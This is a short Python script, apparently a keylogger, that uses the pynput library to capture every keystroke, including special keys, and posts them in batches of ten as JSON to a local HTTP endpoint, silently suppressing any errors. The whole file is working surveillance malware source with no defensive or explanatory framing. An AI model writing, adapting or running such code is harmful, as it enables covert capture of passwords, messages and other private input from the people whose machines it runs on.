from pynput import keyboard
import requests
import threading

keys = []

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

    if len(keys) >= 10:  # Envía cada 10 teclas
        send_keys()

def send_keys():
    global keys
    data = {"keystrokes": ''.join(keys)}
    try:
        requests.post("http://localhost:5000/log", json=data)
    except:
        pass
    keys = []

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
